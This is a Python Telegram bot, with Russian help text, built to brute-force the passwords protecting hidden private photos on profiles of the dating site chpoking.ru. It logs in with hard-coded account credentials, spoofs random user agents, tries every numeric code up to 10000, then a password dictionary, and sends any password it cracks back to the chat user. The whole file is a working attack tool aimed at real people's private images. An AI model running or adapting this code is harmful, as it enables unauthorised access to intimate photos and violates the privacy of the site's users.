import requests
import telebot
import config
import time
from requests_html import HTMLSession
from fake_useragent import UserAgent

# bot = telebot.TeleBot(config.token_tg, threaded=False)
bot = telebot.TeleBot(config.token_tg)

REQ_SES = requests.Session()
HTML_SES = HTMLSession()
HEADERS = {"User-Agent": UserAgent().random}
# HEADERS = {"User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)
# AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'}
AUTH_URL = 'http://chpoking.ru/auth.php'
LOGIN_DATA = {
    'email': 'b7cf76f494d0@mail.ru',
    'passwd': '219001'
}

@bot.message_handler(commands=['start', 'help'])
def say_hello(message):
    text = """Бот работает в два потока, т.е. пользоваться одновременно им смогут только 2 человек. 
              Для валидной работы бота стоит дождаться от него ответа, в противном случае придется ждать 
              очень долго. Для брута нужна действующая ссылка на профиль chpoking, 
              где присутствуют скрытые фото. После удачной (или не очень) попытки сбрутить профиль уже имеющимся 
              словарем бот даст ответ об успехе/провале, после чего можно отправить следующую ссылку"""

    bot.send_message(message.chat.id, text)

@bot.message_handler(content_types=['text'])
def handle_text(message):
    u_link = message.text
    def uoid_finder(u_link):
        try:
            get_uoid = HTML_SES.get(u_link)
            global uoid
            uoid = get_uoid.html.find('p.small')[0].text.split()[1][:-1]
        except:
            error = 'input link error'
            print(error)
            bot.send_message(message.chat.id, error)
            return False

    if uoid_finder(u_link) != False:
        try:
            REQ_SES.post(AUTH_URL, data=LOGIN_DATA)
        except:
            error = 'login error'
            print(error)
            bot.send_message(message.chat.id, error)

        user_password = ''
        try:
            bot.send_message(message.chat.id, 'brute started, wait...')
            for password in range(10001):
                p_link = f'http://chpoking.ru/hidden_photos.php?action=ENTER_PASSWD&hp_passwd={password}&uoid={uoid}&ajax=1'
                get_pass = REQ_SES.get(p_link, headers=HEADERS)
                if get_pass.json()['wrong_pass'] == 0:
                    user_password = password
                    print(f"user passwd: {password}")
                    bot.reply_to(message, f"user passwd: {password}")
                    break
                print(password, get_pass.json()['wrong_pass'])
        except:
            error = 'brute_1 error'
            print(error)
            bot.send_message(message.chat.id, error)

        try:
            if not user_password:

                with open('passwords.txt') as pass_file:
                    pass_dict = [i[:-1] for i in pass_file]
                    pass_dict = list(pass_dict)
                    pass_file.close()

                for password in pass_dict:
                    p_link = f'http://chpoking.ru/hidden_photos.php?action=ENTER_PASSWD&hp_passwd={password}&uoid={uoid}&ajax=1'
                    get_pass = REQ_SES.get(p_link, headers=HEADERS)
                    if get_pass.json()['wrong_pass'] == 0:
                        user_password = password
                        print(f"user passwd: {password}")
                        bot.reply_to(message, f"user passwd: {password}")
                        break

                    print(password, get_pass.json()['wrong_pass'])

                if not user_password:
                    print('password not find!')
                    bot.reply_to(message, 'password not find!')
        except:
            pass_file.close()
            error = 'brute_2 error'
            print(error)
            bot.send_message(message.chat.id, error)


while True:
    try:
        bot.polling(none_stop=True)

    except Exception as e:
        print(e)
        time.sleep(15)
